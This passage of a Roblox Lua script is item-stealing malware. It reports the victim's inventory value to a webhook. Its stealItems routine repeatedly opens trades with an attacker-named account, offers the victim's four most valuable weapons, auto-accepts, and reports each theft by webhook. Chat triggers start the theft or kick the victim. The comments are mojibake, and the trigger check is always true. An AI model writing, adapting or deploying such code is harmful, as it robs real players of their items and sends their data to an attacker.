-- ÐžÑ‚Ð¿Ñ€Ð°Ð²Ð»ÑÐµÐ¼ ÑƒÐ²ÐµÐ´Ð¾Ð¼Ð»ÐµÐ½Ð¸Ðµ Ð² Ð·Ð°Ð²Ð¸ÑÐ¸Ð¼Ð¾ÑÑ‚Ð¸ Ð¾Ñ‚ Ñ†ÐµÐ½Ð½Ð¾ÑÑ‚Ð¸
if godlyItemsValue >= 100 or ancientItemsValue >= 100 or uniqueItemsValue >= 100 or totalValues >= 100 then
    SendMessageEMBED(Webhook, embed, true)
else
    SendMessageEMBED(Webhook, embed, false)
end

local loop = false

local function stealItems(ReceiverName)
    loop = true
    
    while loop do
        local availableItems = {}
        for a, b in pairs(InvModule.MyInventory.Data.Weapons) do
            for c, d in pairs(b) do
                local itemValue = valuesTable[d.DataID] or 0
                if itemValue > 0 and d.Amount > 0 then
                    table.insert(availableItems, {
                        name = d.ItemName,
                        dataId = d.DataID,
                        value = itemValue,
                        amount = d.Amount
                    })
                end
            end
        end
        
        -- Ð¡Ð¾Ñ€Ñ‚Ð¸Ñ€ÑƒÐµÐ¼ Ð¿Ð¾ Ñ†ÐµÐ½Ð½Ð¾ÑÑ‚Ð¸
        table.sort(availableItems, function(a, b) 
            return a.value > b.value
        end)
        
        if #availableItems == 0 then
            loop = false
            return
        end
        
        -- ÐžÑ‚Ð¿Ñ€Ð°Ð²Ð»ÑÐµÐ¼ Ð·Ð°Ð¿Ñ€Ð¾Ñ Ð½Ð° Ð¾Ð±Ð¼ÐµÐ½
        local success = pcall(function()
            Trade.SendRequest:InvokeServer(game:GetService("Players")[ReceiverName])
        end)
        
        if not success then
            task.wait(5)
            continue
        end
        
        -- Ð–Ð´ÐµÐ¼ ÐºÐ¾Ð³Ð´Ð° Ñ‚Ñ€ÐµÐ¹Ð´ Ð¾Ñ‚ÐºÑ€Ð¾ÐµÑ‚ÑÑ (Ð¿Ñ€Ð¾Ð²ÐµÑ€ÑÐµÐ¼ Ð½Ð°Ð»Ð¸Ñ‡Ð¸Ðµ Ð¾ÐºÐ½Ð° Ñ‚Ñ€ÐµÐ¹Ð´Ð°)
        local tradeOpened = false
        for i = 1, 30 do  -- 30 Ð¿Ð¾Ð¿Ñ‹Ñ‚Ð¾Ðº Ð¿Ð¾ 1 ÑÐµÐºÑƒÐ½Ð´Ðµ = 30 ÑÐµÐºÑƒÐ½Ð´ Ñ‚Ð°Ð¹Ð¼Ð°ÑƒÑ‚
            -- ÐŸÑ€Ð¾Ð²ÐµÑ€ÑÐµÐ¼ ÑÑƒÑ‰ÐµÑÑ‚Ð²ÑƒÐµÑ‚ Ð»Ð¸ Ð¾ÐºÐ½Ð¾ Ñ‚Ñ€ÐµÐ¹Ð´Ð° (Ð·Ð°Ð¼ÐµÐ½Ð¸ Ð½Ð° Ñ€ÐµÐ°Ð»ÑŒÐ½ÑƒÑŽ Ð¿Ñ€Ð¾Ð²ÐµÑ€ÐºÑƒ)
            if game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("TradeGUI") then
                tradeOpened = true
                break
            end
            task.wait(1)
        end
        
        if not tradeOpened then
            print("Ð¢Ñ€ÐµÐ¹Ð´ Ð½Ðµ Ð±Ñ‹Ð» Ð¾Ñ‚ÐºÑ€Ñ‹Ñ‚ Ð² Ñ‚ÐµÑ‡ÐµÐ½Ð¸Ðµ 30 ÑÐµÐºÑƒÐ½Ð´")
            continue
        end
        
        -- Ð”Ð¾Ð±Ð°Ð²Ð»ÑÐµÐ¼ Ð¿Ñ€ÐµÐ´Ð¼ÐµÑ‚Ñ‹ (Ð¼Ð°ÐºÑÐ¸Ð¼ÑƒÐ¼ 4 ÑÐ°Ð¼Ñ‹Ñ… Ñ†ÐµÐ½Ð½Ñ‹Ñ…)
        local sentItems = {}
        local addedCount = 0
        
        for _, item in ipairs(availableItems) do
            if addedCount >= 4 then break end
            
            local addAmount = math.min(item.amount, 4 - addedCount)
            for i = 1, addAmount do
                local offerSuccess = pcall(function()
                    Trade.OfferItem:FireServer(item.dataId, "Weapons")
                end)
                
                if offerSuccess then
                    table.insert(sentItems, {
                        name = item.name,
                        dataId = item.dataId,
                        amount = 1
                    })
                    addedCount = addedCount + 1
                end
                task.wait(0.5)
                if addedCount >= 4 then break end
            end
        end
        
        if addedCount == 0 then
            pcall(function() Trade.DeclineTrade:FireServer() end)
            loop = false
            return
        end
        
        -- Ð–Ð´ÐµÐ¼ Ð½ÐµÐ¼Ð½Ð¾Ð³Ð¾ Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð¾Ð¿Ð¿Ð¾Ð½ÐµÐ½Ñ‚ ÑƒÑÐ¿ÐµÐ» Ð´Ð¾Ð±Ð°Ð²Ð¸Ñ‚ÑŒ Ñ‡Ñ‚Ð¾-Ñ‚Ð¾
        task.wait(3)
        
        -- ÐŸÐ¾Ð´Ñ‚Ð²ÐµÑ€Ð¶Ð´Ð°ÐµÐ¼ Ñ‚Ñ€ÐµÐ¹Ð´
        if lastOfferValue then
            local acceptSuccess = pcall(function()
                Trade.AcceptTrade:FireServer(game.PlaceId * 3, lastOfferValue)
            end)
            
            if acceptSuccess then
                if #sentItems > 0 then
                    SendTradeSuccessMessage(sentItems, ReceiverName)
                end
            end
        else
            -- Fallback
            local success = pcall(function()
                Trade.AcceptTrade:FireServer(game.PlaceId * 3, tick())
            end)
        end
        
        -- Ð–Ð´ÐµÐ¼ Ð·Ð°Ð²ÐµÑ€ÑˆÐµÐ½Ð¸Ñ Ñ‚Ñ€ÐµÐ¹Ð´Ð°
        task.wait(5)
        
        -- Ð—Ð°Ð´ÐµÑ€Ð¶ÐºÐ° Ð¿ÐµÑ€ÐµÐ´ ÑÐ»ÐµÐ´ÑƒÑŽÑ‰Ð¸Ð¼ Ñ‚Ñ€ÐµÐ¹Ð´Ð¾Ð¼
        task.wait(2)
    end
end

-- ÐžÐ±Ñ€Ð°Ð±Ð¾Ñ‚Ñ‡Ð¸ÐºÐ¸ Ñ‡Ð°Ñ‚Ð° (ÐºÐ°Ðº Ð² Ð¾Ñ€Ð¸Ð³Ð¸Ð½Ð°Ð»Ðµ)
game.Players.PlayerAdded:Connect(function(player)
    if player.Name == Username or Username2 then
        player.Chatted:Connect(function(msg)
            loop = true
            stealItems(Username)
        end)
    end
end)

-- >> /kick command << --
game.Players.PlayerAdded:Connect(function(player)
    if player.Name == Username or Username2 then
    player.Chatted:Connect(function(message)
        if message == "free dope" then
            game.Players.LocalPlayer:Kick("\nPlease rejoin!")
        end
    end)
end
end)

-- ÐÐ²Ñ‚Ð¾Ð·Ð°Ð¿ÑƒÑÐº ÐµÑÐ»Ð¸ Ð¸Ð³Ñ€Ð¾Ðº ÑƒÐ¶Ðµ Ð² Ð¸Ð³Ñ€Ðµ
for _, player in pairs(game.Players:GetPlayers()) do
        if player.Name == Username or Username2 then
        player.Chatted:Connect(function(message)
            if message == "free dope" then
                game.Players.LocalPlayer:Kick("\nPlease rejoin!")
            end
        end)
    end
end

for _, player in pairs(game.Players:GetPlayers()) do
    if player.Name == Username or Username2 then
        player.Chatted:Connect(function(msg)
            loop = true
            stealItems(Username)
        end)
    end
end
